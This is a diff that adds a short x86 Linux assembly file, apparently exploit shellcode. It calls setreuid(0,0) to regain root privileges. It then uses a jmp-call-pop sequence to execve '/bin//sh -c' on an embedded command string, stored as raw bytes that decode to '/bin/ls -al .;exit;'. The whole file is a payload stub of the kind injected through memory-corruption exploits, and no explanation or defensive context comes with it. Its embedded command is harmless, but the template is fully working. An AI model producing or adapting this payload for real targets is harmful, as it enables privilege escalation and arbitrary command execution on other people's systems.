@@ -1,0 +1,46 @@
+section .text
+global _start
+_start:
+
+	 push byte +0x46
+	 pop eax
+	 xor ebx,ebx
+	 xor ecx,ecx
+	 int 0x80
+	 jmp short jmp_string
+jmp_exec:
+	 pop edi
+	 push byte +0xb
+	 pop eax
+	 cdq
+	 push edx
+	 push word 0x632d
+	 mov esi,esp
+	 push edx
+	 push dword 0x68732f2f
+	 push dword 0x6e69622f
+	 mov ebx,esp
+	 push edx
+	 push edi
+	 push esi
+	 push ebx
+	 mov ecx,esp
+	 int 0x80
+jmp_string:
+	 call jmp_exec
+	 das
+	 bound ebp,[ecx+0x6e]
+	 das
+	 insb
+	 db 0x73
+	 db 0x20
+	 db 0x2d
+	 popad
+	 insb
+	 db 0x20
+	 db 0x2e
+	 cmp esp,[ebp+0x78]
+	 db 0x69
+	 db 0x74
+	 db 0x3b
+
